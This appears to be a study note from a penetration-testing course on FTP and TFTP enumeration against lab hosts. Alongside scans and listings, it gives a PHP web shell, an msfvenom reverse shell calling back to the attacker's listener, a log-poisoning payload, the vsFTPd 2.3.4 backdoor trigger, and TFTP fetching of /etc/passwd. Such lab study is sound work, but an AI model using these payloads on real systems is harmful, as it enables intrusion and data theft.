---
tags: [module/footprinting, ftp, tftp, service-enumeration, level/advanced, practical]
---

# FTP Enumeration - Practical Application

## Complete FTP Enumeration Workflow

Phase 1: Service Discovery
Phase 2: Anonymous Access Testing
Phase 3: Configuration Analysis
Phase 4: File/Directory Enumeration
Phase 5: Download Exploitation
Phase 6: Upload Exploitation
Phase 7: Version-Specific Vulnerability Checks

---

## Phase 1: Service Discovery

### Nmap FTP Scripts

List all FTP-related NSE scripts:

find /usr/share/nmap/scripts/ -name "ftp*" -exec basename {} \; | sort

Common FTP scripts:
- ftp-anon.nse - Check anonymous access
- ftp-bounce.nse - Test FTP bounce attacks
- ftp-brute.nse - Brute force credentials
- ftp-libopie.nse - Check OTP support
- ftp-proftpd-backdoor.nse - Check for ProFTPD backdoor
- ftp-syst.nse - Get system information
- ftp-vsftpd-backdoor.nse - Check vsFTPd backdoor
- ftp-vuln-cve2010-4221.nse - Check specific CVE

### Basic Nmap Scan

sudo nmap -sV -p21 -sC -A 10.129.14.136

Expected output:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed
| ftp-syst: 
|   STAT: 
|     FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      vsFTPd 3.0.3 - secure, fast, stable

### Nmap with Script Trace

sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

Shows actual network communication:
NSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome...

---

## Phase 2: Anonymous Access Testing

### Manual Connection

nc -nv 10.129.14.136 21
telnet 10.129.14.136 21

### FTP Client Login

ftp 10.129.14.136
Name: anonymous
Password: anonymous

### Check Server Status

ftp> status
ftp> debug
ftp> trace

### Get System Info

ftp> syst
215 UNIX Type: L8

### Get Detailed Server Status

ftp> stat
211-FTP server status:
     Connected to 10.10.14.4
     Logged in as ftp
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is 300
     Control connection is plain text
     Data connections will be plain text
     vsFTPd 3.0.3 - secure, fast, stable
211 End of status

---

## Phase 3: Configuration Analysis

### vsFTPd Configuration (if you gain access)

cat /etc/vsftpd.conf | grep -v "^#"

### Dangerous Settings to Look For

grep -E "anonymous_enable=YES|anon_upload_enable=YES|anon_mkdir_write_enable=YES|write_enable=YES|chown_uploads=YES|no_anon_password=YES" /etc/vsftpd.conf

### Check Denied Users

cat /etc/ftpusers

### Hidden ID Settings

If hide_ids=YES is set, file ownership shows as "ftp" instead of UIDs:

-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx

This is a security feature to hide actual usernames.

---

## Phase 4: File/Directory Enumeration

### Basic Listing

ftp> ls

### Recursive Listing (if enabled)

ftp> ls -R

This shows ALL files in ALL directories at once.

Output example:
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx

### Check Write Permissions

Look for directories with write permission (drwxrwxrwx or -rwxrwxrwx)

---

## Phase 5: Download Exploitation

### Download Single File

ftp> get Important\ Notes.txt

### Download Multiple Files

ftp> mget *.txt

### Download Everything (with wget)

wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

This creates directory structure:
10.129.14.136/
├── Calendar.pptx
├── Clients/
│   └── Inlanefreight/
│       ├── appointments.xlsx
│       ├── contract.docx
│       └── meetings.txt
├── Documents/
├── Employees/
└── Important Notes.txt

### Analyze Downloaded Files

file */*
strings *.pptx
grep -i "password\|secret\|key" *

---

## Phase 6: Upload Exploitation

### Test Write Permissions

Create a test file:
echo "test" > test.txt

Upload it:
ftp> put test.txt

Check if it appears:
ftp> ls

### Web Server Integration

If FTP root is web-accessible, upload web shells:

Create PHP shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

Upload:
ftp> put shell.php

Access via browser:
http://10.129.14.136/shell.php\?cmd\=id

### Upload Reverse Shell

Create reverse shell (msfvenom):
msfvenom -p php/reverse_php LHOST=10.10.14.4 LPORT=4444 -f raw > revshell.php

Upload:
ftp> put revshell.php

Set up listener:
nc -lvnp 4444

Trigger via browser:
http://10.129.14.136/revshell.php

### Log Poisoning (if FTP logs are readable)

If you can upload and the server includes files, try:
echo "<?php system($_GET['cmd']); ?>" > poison.php

Then access via LFI:
http://target.com/page.php\?file\=ftp://10.129.14.136/poison.php\&cmd\=id

---

## Phase 7: Version-Specific Vulnerabilities

### vsFTPd Backdoor (version 2.3.4)

Check version from banner or nmap.

If vulnerable:
nc 10.129.14.136 21
USER letmein:)
PASS anything

This opens a shell on port 6200:
nc 10.129.14.136 6200

### ProFTPD 1.3.5 - Mod_Copy Exploit

Used to copy files without authentication.

### FTP Bounce Attacks

Check if server allows bounce:
nmap --script ftp-bounce -p21 10.129.14.136

If vulnerable, can use server to scan other hosts:
nmap -b username:password@ftp-server target-host

---

## SSL/TLS FTP

### Connect with SSL

openssl s_client -connect 10.129.14.136:21 -starttls ftp

### Extract Certificate Info

openssl s_client -connect 10.129.14.136:21 -starttls ftp 2>/dev/null | openssl x509 -text

Look for:
- Subject: CN, O, L, ST, C
- Issuer
- Validity dates
- SAN (Subject Alternative Names)
- Email addresses

Example:
Subject: C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb

This reveals hostnames and admin email.

---

## TFTP Enumeration

### Check if TFTP is running

nmap -sU -p69 10.129.14.136

### Connect with TFTP client

tftp 10.129.14.136

### TFTP Commands

tftp> status
tftp> verbose
tftp> get /etc/passwd
tftp> put localfile remotefile

### TFTP Brute Forcing (since no directory listing)

Create wordlist of common filenames:
echo -e "config\nbackup\npassword\npasswd\nshadow\nhosts\nnetwork\ninterfaces\n*.conf\n*.cfg" > tftp-files.txt

Use a script to try each:
while read file; do
    echo "get $file" | tftp 10.129.14.136 2>/dev/null | grep -v "Error"
done < tftp-files.txt

---

## Complete Automation Script

Save as ftp-enum.sh:

#!/bin/bash
TARGET=$1

echo "[*] Starting FTP enumeration on $TARGET"

echo "[*] Running Nmap scan..."
nmap -sV -p21 --script ftp-* -oN ftp-nmap.txt $TARGET

echo "[*] Checking anonymous access..."
echo -e "user anonymous\npass anonymous\nquit" | nc -nv $TARGET 21 2>&1 | tee ftp-anon.txt

echo "[*] Attempting FTP connection..."
ftp -nv $TARGET <<EOF > ftp-details.txt
user anonymous anonymous
debug
trace
status
syst
stat
quit
EOF

echo "[*] Testing wget mirror..."
wget -m --no-passive ftp://anonymous:anonymous@$TARGET 2>&1 | tee ftp-wget.log

echo "[*] Checking SSL/TLS (if enabled)..."
openssl s_client -connect $TARGET:21 -starttls ftp 2>/dev/null | openssl x509 -text -noout > ftp-cert.txt 2>/dev/null

echo "[*] FTP enumeration complete. Check ftp-*.txt files"

---

## Key Takeaways

- Always check for anonymous access first
- Use debug and trace to see server commands
- Recursive listing (-R) shows everything at once
- Download all files with wget -m
- Upload capabilities + web access = RCE
- FTP logs can be used for log poisoning
- SSL certificates reveal hostnames and emails
- TFTP requires filename brute forcing
- Version-specific exploits exist (vsFTPd 2.3.4 backdoor)
- Check /etc/ftpusers for denied users (if you gain access)
- Hide_ids=YES obscures UIDs, making identification harder
- Writeable directories are opportunities
